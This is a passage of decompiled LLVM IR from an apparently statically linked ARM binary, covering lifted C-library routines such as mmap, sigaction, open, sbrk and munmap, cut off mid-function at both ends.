  store i32 %v4_d3f4, i32* %r2.global-to-local, align 4
  br i1 %v2_d3f0, label %.thread47, label %bb64

.thread47:                                        ; preds = %dec_label_pc_d3d4
  %v2_d3fc48 = inttoptr i32 %v4_d3f4 to i32*
  store i32 0, i32* %v2_d3fc48, align 4
  br label %bb65

bb64:                                             ; preds = %dec_label_pc_d3d4
  %v2_d3f8 = add i32 %v4_d3e8, 1
  store i32 %v2_d3f8, i32* %r3.global-to-local, align 4
  %v2_d3fc = inttoptr i32 %v4_d3f4 to i32*
  store i32 %v4_d3e8, i32* %v2_d3fc, align 4
  %v1_d400 = load i32, i32* %r3.global-to-local, align 4
  %v2_d400 = load i32, i32* %r2.global-to-local, align 4
  %v3_d400 = inttoptr i32 %v2_d400 to i32*
  store i32 %v1_d400, i32* %v3_d400, align 4
  br label %bb65

bb65:                                             ; preds = %.thread47, %bb64, %dec_label_pc_d3bc
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_d418 = load i32, i32* @r6, align 4
  %v2_d418 = add i32 %v0_d418, -12
  store i32 %v2_d418, i32* %r8.global-to-local, align 4
  store i32 1292, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_d428 = add i32 %v0_d418, 1292
  %v4_d428 = inttoptr i32 %v3_d428 to i32*
  store i32 %arg5, i32* %v4_d428, align 4
  %v0_d44017 = load i32, i32* %r4.global-to-local, align 4
  %v1_d44018 = load i32, i32* %r5.global-to-local, align 4
  %v3_d44020 = icmp ult i32 %v0_d44017, %v1_d44018
  %v9_d44026 = icmp eq i32 %v0_d44017, %v1_d44018
  store i1 %v9_d44026, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d44020, label %dec_label_pc_d430, label %dec_label_pc_d470.lr.ph

dec_label_pc_d430:                                ; preds = %dec_label_pc_d430, %bb65
  %v1_d430 = phi i32 [ %v1_d43c, %dec_label_pc_d430 ], [ %v0_d44017, %bb65 ]
  %v0_d430 = load i32, i32* %r8.global-to-local, align 4
  %v4_d430 = mul i32 %v1_d430, 4
  %v5_d430 = add i32 %v4_d430, %v0_d430
  %v6_d430 = inttoptr i32 %v5_d430 to i32*
  %v7_d430 = load i32, i32* %v6_d430, align 4
  store i32 %v7_d430, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_d430)
  %v0_d43c = load i32, i32* %r4.global-to-local, align 4
  %v1_d43c = add i32 %v0_d43c, 1
  store i32 %v1_d43c, i32* %r4.global-to-local, align 4
  %v1_d440 = load i32, i32* %r5.global-to-local, align 4
  %v3_d440 = icmp ult i32 %v1_d43c, %v1_d440
  %v9_d440 = icmp eq i32 %v1_d43c, %v1_d440
  store i1 %v9_d440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d440, label %dec_label_pc_d430, label %dec_label_pc_d470.lr.ph

dec_label_pc_d470.lr.ph:                          ; preds = %dec_label_pc_d430, %bb65
  %v2_d448 = icmp eq i32 %v0_d2a4, 0
  store i1 %v2_d448, i1* %cpsr_z.global-to-local, align 1
  %v2_d450 = xor i1 %v2_d448, true
  call void @__pseudo_cond_branch(i1 %v2_d450, i32 %v0_d2a4)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_d464 = load i32, i32* @r6, align 4
  %v2_d464 = add i32 %v0_d464, -12
  store i32 %v2_d464, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d470

dec_label_pc_d470:                                ; preds = %dec_label_pc_d470.dec_label_pc_d470_crit_edge, %dec_label_pc_d470.lr.ph
  %v1_d470 = phi i32 [ %v1_d47c, %dec_label_pc_d470.dec_label_pc_d470_crit_edge ], [ 0, %dec_label_pc_d470.lr.ph ]
  %v0_d470 = phi i32 [ %v0_d470.pre, %dec_label_pc_d470.dec_label_pc_d470_crit_edge ], [ %v2_d464, %dec_label_pc_d470.lr.ph ]
  %v4_d470 = mul i32 %v1_d470, 4
  %v5_d470 = add i32 %v4_d470, %v0_d470
  %v6_d470 = inttoptr i32 %v5_d470 to i32*
  %v7_d470 = load i32, i32* %v6_d470, align 4
  store i32 %v7_d470, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_d470)
  %v0_d47c = load i32, i32* %r4.global-to-local, align 4
  %v1_d47c = add i32 %v0_d47c, 1
  store i32 %v1_d47c, i32* %r4.global-to-local, align 4
  %v1_d480 = load i32, i32* %r5.global-to-local, align 4
  %v3_d480 = icmp ult i32 %v1_d47c, %v1_d480
  %v9_d480 = icmp eq i32 %v1_d47c, %v1_d480
  store i1 %v9_d480, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d480, label %dec_label_pc_d470.dec_label_pc_d470_crit_edge, label %dec_label_pc_d488

dec_label_pc_d470.dec_label_pc_d470_crit_edge:    ; preds = %dec_label_pc_d470
  %v0_d470.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_d470

dec_label_pc_d488:                                ; preds = %dec_label_pc_d470
  %v0_d48c.pre = load i32, i32* @r6, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_d48c = add i32 %v0_d48c.pre, 108
  %v3_d48c = inttoptr i32 %v2_d48c to i32*
  %v4_d48c = load i32, i32* %v3_d48c, align 4
  store i32 %v4_d48c, i32* %r2.global-to-local, align 4
  store i32 %v4_d48c, i32* %r3.global-to-local, align 4
  %v2_d494 = icmp eq i32 %v4_d48c, 0
  store i1 %v2_d494, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d494, label %dec_label_pc_d4ac, label %dec_label_pc_d49c

dec_label_pc_d49c:                                ; preds = %dec_label_pc_d488
  call void @__pseudo_branch(i32 %v4_d48c)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_d4a8 = load i32, i32* @r0, align 4
  %v2_d4a8 = inttoptr i32 %v1_d4a8 to i32*
  store i32 0, i32* %v2_d4a8, align 4
  %v0_d4b0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_d4ac

dec_label_pc_d4ac:                                ; preds = %dec_label_pc_d488, %dec_label_pc_d49c
  %v0_d4b0 = phi i32 [ %v0_d48c.pre, %dec_label_pc_d488 ], [ %v0_d4b0.pre, %dec_label_pc_d49c ]
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_d4b0 = add i32 %v0_d4b0, 84
  %v3_d4b0 = inttoptr i32 %v2_d4b0 to i32*
  %v4_d4b0 = load i32, i32* %v3_d4b0, align 4
  store i32 %v4_d4b0, i32* %r2.global-to-local, align 4
  store i32 %v4_d4b0, i32* %r3.global-to-local, align 4
  %v2_d4b8 = icmp eq i32 %v4_d4b0, 0
  store i1 %v2_d4b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d4b8, label %dec_label_pc_d4d0, label %dec_label_pc_d4c0

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d4ac
  call void @__pseudo_branch(i32 %v4_d4b0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_d4cc = load i32, i32* @r0, align 4
  %v2_d4cc = inttoptr i32 %v1_d4cc to i32*
  store i32 0, i32* %v2_d4cc, align 4
  %v0_d4d4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_d4d0

dec_label_pc_d4d0:                                ; preds = %dec_label_pc_d4ac, %dec_label_pc_d4c0
  %v0_d4d4 = phi i32 [ %v0_d4b0, %dec_label_pc_d4ac ], [ %v0_d4d4.pre, %dec_label_pc_d4c0 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_d4d4 = add i32 %v0_d4d4, 28
  %v3_d4d4 = inttoptr i32 %v2_d4d4 to i32*
  %v4_d4d4 = load i32, i32* %v3_d4d4, align 4
  store i32 %v4_d4d4, i32* %r3.global-to-local, align 4
  %v1_d4dc = inttoptr i32 %v4_d4d4 to i32*
  %v2_d4dc = load i32, i32* %v1_d4dc, align 4
  store i32 %v2_d4dc, i32* %r2.global-to-local, align 4
  %v0_d4e0 = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_d4ec = call i32 @__GI_exit(i32 %v0_d4e0)
  %v0_d4f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d4f0, label %bb66, label %.thread8

bb66:                                             ; preds = %dec_label_pc_d4d0
  %v2_d4f4 = load i32, i32* %r4.global-to-local, align 4
  %v8_d4f4 = shl i32 %v2_d4f4, %v1_d4ec
  %v9_d4f4 = and i32 %v8_d4f4, %v1_d4ec
  %v2_d4f8 = load i32, i32* %ip.global-to-local, align 4
  %v8_d4f8 = shl i32 %v2_d4f8, %v9_d4f4
  %v9_d4f8 = and i32 %v8_d4f8, %v9_d4f4
  %v3_d4fc = load i32, i32* %r5.global-to-local, align 4
  %v8_d4fc = shl i32 %v9_d4f8, %v3_d4fc
  %v9_d4fc = and i32 %v8_d4fc, %v9_d4f8
  %v2_d504 = load i32, i32* @r2, align 4
  %v3_d504 = and i32 %v9_d4fc, %v2_d504
  store i32 %v3_d504, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_d4d0, %bb66
  %v4_d510 = phi i32 [ %v1_d4ec, %dec_label_pc_d4d0 ], [ 0, %bb66 ]
  ret i32 %v4_d510

; uselistorder directives
  uselistorder i32 %v1_d4ec, { 1, 0, 2 }
  uselistorder i32 %v0_d48c.pre, { 1, 0 }
  uselistorder i32 %v1_d480, { 1, 0 }
  uselistorder i32 %v1_d47c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_d440, { 1, 0 }
  uselistorder i32 %v1_d43c, { 1, 2, 3, 0 }
  uselistorder i32 %v4_d3f4, { 1, 0, 2 }
  uselistorder i1 %v8_d33c, { 1, 2, 0 }
  uselistorder i32 %v2_d30c, { 1, 2, 0 }
  uselistorder i1 %v2_d2f4, { 1, 0 }
  uselistorder i32 %v4_d2d8, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_d2a4, { 1, 0 }
  uselistorder i32 %v3_d274, { 1, 0 }
  uselistorder i32 %tmp53, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp52, { 1, 0 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0, 4, 6, 5, 7, 9, 8, 10, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 1, 12, 13, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 2, 7, 8, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 0, 20 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_d4d0, { 1, 0 }
  uselistorder label %dec_label_pc_d4ac, { 1, 0 }
  uselistorder label %bb65, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d3bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d398, { 3, 0, 1, 2 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_d30c, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_d2f4, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_d530 = load i32, i32* @r4, align 4
  store i32 %v3_d530, i32* %stack_var_-16, align 4
  %v3_d53c = urem i32 %arg3, 4096
  %v2_d540 = icmp eq i32 %v3_d53c, 0
  br i1 %v2_d540, label %dec_label_pc_d55c, label %dec_label_pc_d548

dec_label_pc_d548:                                ; preds = %entry
  %v0_d548 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_d554 = inttoptr i32 %v0_d548 to i32*
  store i32 22, i32* %v2_d554, align 4
  %v0_d58c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d58c

dec_label_pc_d55c:                                ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_d588, label %dec_label_pc_d578

dec_label_pc_d578:                                ; preds = %dec_label_pc_d55c
  %v0_d578 = call i32 @__GI___errno_location()
  %v0_d57c = load i32, i32* %r4.global-to-local, align 4
  %v1_d57c = sub i32 0, %v0_d57c
  %v2_d580 = inttoptr i32 %v0_d578 to i32*
  store i32 %v1_d57c, i32* %v2_d580, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d588

dec_label_pc_d588:                                ; preds = %dec_label_pc_d55c, %dec_label_pc_d578
  %v0_d588 = phi i32 [ %arg1, %dec_label_pc_d55c ], [ -1, %dec_label_pc_d578 ]
  store i32 %v0_d588, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d58c

dec_label_pc_d58c:                                ; preds = %dec_label_pc_d548, %dec_label_pc_d588
  %v0_d58c = phi i32 [ %v0_d58c.pre, %dec_label_pc_d548 ], [ %v0_d588, %dec_label_pc_d588 ]
  %v2_d590 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_d590, i32* @r4, align 4
  ret i32 %v0_d58c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d58c, { 1, 0 }
  uselistorder label %dec_label_pc_d588, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v6_d598 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_d5a0 = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_d5a0, label %dec_label_pc_d5f4, label %dec_label_pc_d5b8

dec_label_pc_d5b8:                                ; preds = %entry
  %v1_d5b8 = add i32 %arg2, 4
  %v2_d5b8 = inttoptr i32 %v1_d5b8 to i32*
  %v3_d5b8 = load i32, i32* %v2_d5b8, align 4
  store i32 %v3_d5b8, i32* @r3, align 4
  %v1_d5bc = and i32 %v3_d5b8, 67108864
  %v2_d5bc = icmp eq i32 %v1_d5bc, 0
  br i1 %v2_d5bc, label %dec_label_pc_d5c4, label %dec_label_pc_d5f4

dec_label_pc_d5c4:                                ; preds = %dec_label_pc_d5b8
  store i32 20, i32* @r2, align 4
  %v2_d5c8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_d5c8, i32* @r0, align 4
  %v0_d5cc = call i32 @memcpy()
  %v0_d5f4.pre = load i32, i32* @r5, align 4
  %v0_d5fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d5f4

dec_label_pc_d5f4:                                ; preds = %dec_label_pc_d5b8, %entry, %dec_label_pc_d5c4
  %v0_d5fc = phi i32 [ %arg3, %dec_label_pc_d5b8 ], [ %arg3, %entry ], [ %v0_d5fc.pre, %dec_label_pc_d5c4 ]
  %v0_d5f8 = phi i32 [ %arg2, %dec_label_pc_d5b8 ], [ 0, %entry ], [ %v2_d5c8, %dec_label_pc_d5c4 ]
  %v0_d5f4 = phi i32 [ %arg1, %dec_label_pc_d5b8 ], [ %arg1, %entry ], [ %v0_d5f4.pre, %dec_label_pc_d5c4 ]
  %v4_d604 = call i32 @__syscall_rt_sigaction(i32 %v0_d5f4, i32 %v0_d5f8, i32 %v0_d5fc, i32 8)
  store i32 %v6_d598, i32* @r5, align 4
  ret i32 %v4_d604

; uselistorder directives
  uselistorder label %dec_label_pc_d5f4, { 2, 0, 1 }
}

define i32 @function_d618(i32 %arg1) local_unnamed_addr {
dec_label_pc_d618:
  %v0_d618 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d618, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_d618
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d618, %bb
  %v0_d620 = phi i32 [ %arg1, %dec_label_pc_d618 ], [ 0, %bb ]
  ret i32 %v0_d620

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_d634 = load i32, i32* @r0, align 4
  ret i32 %v0_d634
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d638 = load i32, i32* @r7, align 4
  store i32 %v3_d638, i32* %stack_var_-8, align 4
  %v0_d644 = load i32, i32* @r0, align 4
  store i32 %v0_d644, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d644, -4095
  br i1 %tmp, label %dec_label_pc_d660, label %dec_label_pc_d650

dec_label_pc_d650:                                ; preds = %entry
  %v0_d650 = call i32 @__GI___errno_location()
  %v0_d654 = load i32, i32* %r7.global-to-local, align 4
  %v1_d654 = sub i32 0, %v0_d654
  %v2_d658 = inttoptr i32 %v0_d650 to i32*
  store i32 %v1_d654, i32* %v2_d658, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_d664.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_d660

dec_label_pc_d660:                                ; preds = %entry, %dec_label_pc_d650
  %v2_d664 = phi i32 [ %v3_d638, %entry ], [ %v2_d664.pre, %dec_label_pc_d650 ]
  %v0_d660 = phi i32 [ %v0_d644, %entry ], [ -1, %dec_label_pc_d650 ]
  store i32 %v2_d664, i32* @r7, align 4
  ret i32 %v0_d660

; uselistorder directives
  uselistorder i32 %v0_d644, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d660, { 1, 0 }
}

define i32 @__GI_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_d66c = load i32, i32* @r2, align 4
  %v9_d66c = load i32, i32* @r3, align 4
  store i32 %v9_d66c, i32* %stack_var_-4, align 4
  %v1_d67c = and i32 %arg2, 64
  %v2_d67c = icmp eq i32 %v1_d67c, 0
  br i1 %v2_d67c, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v3_d684 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_d684, i32* @r3, align 4
  %phitmp = urem i32 %v6_d66c, 65536
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_d688 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_d688, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_d6b8, label %dec_label_pc_d6a8

dec_label_pc_d6a8:                                ; preds = %.thread
  %v0_d6a8 = call i32 @__GI___errno_location()
  %v0_d6ac = load i32, i32* %r7.global-to-local, align 4
  %v1_d6ac = sub i32 0, %v0_d6ac
  store i32 %v1_d6ac, i32* @r3, align 4
  %v2_d6b0 = inttoptr i32 %v0_d6a8 to i32*
  store i32 %v1_d6ac, i32* %v2_d6b0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d6b8

dec_label_pc_d6b8:                                ; preds = %.thread, %dec_label_pc_d6a8
  %v0_d6b8 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_d6a8 ]
  ret i32 %v0_d6b8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d6b8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_d6d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 96) to i32*), align 4
  %v1_d6dc = inttoptr i32 %v4_d6d8 to i32*
  %v2_d6dc = load i32, i32* %v1_d6dc, align 4
  %v2_d6e0 = icmp eq i32 %v2_d6dc, 0
  br i1 %v2_d6e0, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_d6e8 = phi i32 [ %v2_d6dc, %entry ], [ 4096, %bb ]
  ret i32 %v1_d6e8

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_d704 = load i32, i32* @r0, align 4
  ret i32 %v1_d704
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d708 = load i32, i32* @r7, align 4
  store i32 %v3_d708, i32* %stack_var_-8, align 4
  %v0_d714 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d714, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d714, -4095
  br i1 %tmp, label %dec_label_pc_d734, label %dec_label_pc_d724

dec_label_pc_d724:                                ; preds = %entry
  %v0_d724 = call i32 @__GI___errno_location()
  %v0_d728 = load i32, i32* %r7.global-to-local, align 4
  %v1_d728 = sub i32 0, %v0_d728
  %v2_d72c = inttoptr i32 %v0_d724 to i32*
  store i32 %v1_d728, i32* %v2_d72c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_d734.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_d734

dec_label_pc_d734:                                ; preds = %entry, %dec_label_pc_d724
  %v1_d738 = phi i32 [ %v0_d714, %entry ], [ -1, %dec_label_pc_d724 ]
  %v2_d734 = phi i32 [ %v3_d708, %entry ], [ %v2_d734.pre, %dec_label_pc_d724 ]
  store i32 %v2_d734, i32* %r7.global-to-local, align 4
  ret i32 %v1_d738

; uselistorder directives
  uselistorder i32 %v0_d714, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d734, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_d74c = load i32, i32* @r0, align 4
  ret i32 %v1_d74c
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_d760 = load i32, i32* @r0, align 4
  ret i32 %v1_d760
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_d764 = load i32, i32* @r4, align 4
  store i32 %v3_d764, i32* %stack_var_-16, align 4
  store i32 9508, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r4.global-to-local, align 4
  %v4_d774 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 9508) to i32*), align 4
  %v2_d778 = icmp eq i32 %v4_d774, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_d778, label %dec_label_pc_d784, label %dec_label_pc_d794

dec_label_pc_d784:                                ; preds = %entry
  %v1_d788 = call i32 @__GI_brk(i32 0)
  %v1_d78c = icmp slt i32 %v1_d788, 0
  br i1 %v1_d78c, label %dec_label_pc_d7b8, label %dec_label_pc_d794thread-pre-split

dec_label_pc_d794thread-pre-split:                ; preds = %dec_label_pc_d784
  %v0_d798.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_d794.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d794.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d794

dec_label_pc_d794:                                ; preds = %dec_label_pc_d794thread-pre-split, %entry
  %v1_d794 = phi i32 [ %v1_d794.pre, %dec_label_pc_d794thread-pre-split ], [ 9508, %entry ]
  %v0_d794 = phi i32 [ %v0_d794.pre, %dec_label_pc_d794thread-pre-split ], [ ptrtoint (i32* @global_var_1f010.69 to i32), %entry ]
  %v1_d7a8 = phi i32 [ %v0_d798.pr, %dec_label_pc_d794thread-pre-split ], [ %arg1, %entry ]
  %v2_d794 = add i32 %v0_d794, %v1_d794
  %v3_d794 = inttoptr i32 %v2_d794 to i32*
  %v4_d794 = load i32, i32* %v3_d794, align 4
  %v2_d798 = icmp eq i32 %v1_d7a8, 0
  store i32 %v4_d794, i32* %r4.global-to-local, align 4
  br i1 %v2_d798, label %dec_label_pc_d7bc, label %dec_label_pc_d7a4

dec_label_pc_d7a4:                                ; preds = %dec_label_pc_d794
  %v2_d7a8 = add i32 %v4_d794, %v1_d7a8
  %v1_d7ac = call i32 @__GI_brk(i32 %v2_d7a8)
  %v1_d7b0 = icmp slt i32 %v1_d7ac, 0
  br i1 %v1_d7b0, label %dec_label_pc_d7b8, label %dec_label_pc_d7a4.dec_label_pc_d7bc_crit_edge

dec_label_pc_d7a4.dec_label_pc_d7bc_crit_edge:    ; preds = %dec_label_pc_d7a4
  %v0_d7bc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d7bc

dec_label_pc_d7b8:                                ; preds = %dec_label_pc_d7a4, %dec_label_pc_d784
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d7bc

dec_label_pc_d7bc:                                ; preds = %dec_label_pc_d794, %dec_label_pc_d7a4.dec_label_pc_d7bc_crit_edge, %dec_label_pc_d7b8
  %v0_d7bc = phi i32 [ %v0_d7bc.pre, %dec_label_pc_d7a4.dec_label_pc_d7bc_crit_edge ], [ -1, %dec_label_pc_d7b8 ], [ %v4_d794, %dec_label_pc_d794 ]
  %v2_d7c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_d7c0, i32* @r4, align 4
  ret i32 %v0_d7bc

; uselistorder directives
  uselistorder i32 %v4_d794, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_d7bc, { 2, 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_d7e0 = load i32, i32* @r0, align 4
  ret i32 %v1_d7e0
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_d7e8 = ptrtoint i32* %stack_var_-16 to i32
  %v2_d7f4 = call i32 @getrlimit(i32 7, i32 %v2_d7e8)
  %v1_d7f8 = icmp slt i32 %v2_d7f4, 0
  %v5_d7fc = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_d7f8, i32 256, i32 %v5_d7fc
  ret i32 %storemerge
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d810 = load i32, i32* @r7, align 4
  store i32 %v3_d810, i32* %stack_var_-8, align 4
  %v0_d81c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d81c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d81c, -4095
  br i1 %tmp, label %dec_label_pc_d83c, label %dec_label_pc_d82c

dec_label_pc_d82c:                                ; preds = %entry
  %v0_d82c = call i32 @__GI___errno_location()
  %v0_d830 = load i32, i32* %r7.global-to-local, align 4
  %v1_d830 = sub i32 0, %v0_d830
  %v2_d834 = inttoptr i32 %v0_d82c to i32*
  store i32 %v1_d830, i32* %v2_d834, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_d83c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_d83c

dec_label_pc_d83c:                                ; preds = %entry, %dec_label_pc_d82c
  %v1_d840 = phi i32 [ %v0_d81c, %entry ], [ -1, %dec_label_pc_d82c ]
  %v2_d83c = phi i32 [ %v3_d810, %entry ], [ %v2_d83c.pre, %dec_label_pc_d82c ]
  store i32 %v2_d83c, i32* @r7, align 4
  ret i32 %v1_d840

; uselistorder directives
  uselistorder i32 %v0_d81c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d83c, { 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_d854 = load i32, i32* @r0, align 4
  ret i32 %v1_d854
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
